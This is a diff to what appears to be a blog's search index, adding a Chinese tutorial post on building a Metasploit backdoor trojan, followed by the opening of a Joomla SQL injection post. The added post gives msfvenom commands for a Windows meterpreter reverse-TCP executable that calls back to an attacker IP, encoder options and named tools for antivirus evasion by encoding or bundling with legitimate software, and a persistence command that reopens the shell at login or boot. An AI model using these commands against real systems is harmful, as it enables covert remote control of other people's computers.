@@ -4,6 +4,26 @@
   
     
     <entry>
+      <title><![CDATA[MSF生成木马后门]]></title>
+      <url>http://isron.cn/2017/06/15/msf_backdoor/</url>
+      <content type="html"><![CDATA[<p>在玩msf的时候发现很多人会利用反弹shell的payload去生成一个小木马，网上教程也很多了，就不再过多赘述了，=.=<a id="more"></a></p>
+<h2 id="木马生成"><a href="#木马生成" class="headerlink" title="木马生成"></a>木马生成</h2><p><code>msfvenom</code>是用来制作有效载荷的工具，经常跟msf配套使用<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows<span class="regexp">/meterpreter/</span>reverse_tcp LHOST=ip LPORT=port -f exe &gt; <span class="regexp">/root/</span>Isron.exe</div></pre></td></tr></table></figure></p>
+<p>利用上述命令就可以生成一个简单的exe文件格式的木马，当然也不止限于这一种格式 通过更改<code>-p</code>参数可以生成其他payload的木马</p>
+<h2 id="木马免杀"><a href="#木马免杀" class="headerlink" title="木马免杀"></a>木马免杀</h2><p>在家庭计算机很多都会带有杀毒软件，所以需要做一些免杀，免杀主要的两种方式就是编码和捆绑。<br>编码可以使用<code>msfvenom</code>的编码功能去进行免杀（试了一下好像不能免杀了，逃<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">msfvenom -<span class="selector-tag">p</span> windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -<span class="selector-tag">i</span> <span class="number">12</span> -<span class="selector-tag">b</span> <span class="string">'\x00'</span> LHOST=ip LPORT=port -f exe &gt; /root/Isron<span class="selector-class">.exe</span></div><div class="line">-p选择指定payload</div><div class="line">–e选择制定编码器</div><div class="line">-<span class="selector-tag">i</span> 编码次数</div><div class="line">-<span class="selector-tag">b</span> 去多余/坏字符</div></pre></td></tr></table></figure></p>
+<p>也可以使用Veil：<a href="https://github.com/Veil-Framework/Veil-Evasion" target="_blank" rel="external">Veil安装与基本用法</a>，去生成免杀木马<br>捆绑顾名思义就是将我们的木马与正常的软件进行捆绑进行免杀，可以使用<code>shellter</code>进行捆绑。</p>
+<h2 id="持续控制"><a href="#持续控制" class="headerlink" title="持续控制"></a>持续控制</h2><p>在攻击成功之后会反弹回一个会话，当木马被删除或不继续运行时，我们就无法再获得反弹的会话，那么想要进行一个持续的控制就需要在第一次获得会话时动一些手脚<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">run persistence -U -<span class="selector-tag">i</span> <span class="number">5</span> -r 攻击机ip -<span class="selector-tag">p</span> 反弹端口</div><div class="line">-U 用户登录时反弹会话也可以-X当系统启动时反弹会话</div><div class="line">-<span class="selector-tag">i</span> 时间</div></pre></td></tr></table></figure></p>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> 渗透测试 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[Joomla3.7.0 Core SQL注入]]></title>
       <url>http://isron.cn/2017/06/12/CVE-2017-8917/</url>
       <content type="html"><![CDATA[<h2 id="关于Joomla"><a href="#关于Joomla" class="headerlink" title="关于Joomla"></a>关于Joomla</h2><p>Joomla!是一套全球知名的内容管理系统。Joomla!是使用PHP语言加上MySQL数据库所开发的软件系统，可以在Linux、 Windows、MacOSX等各种不同的平台上执行。<a id="more"></a></p>
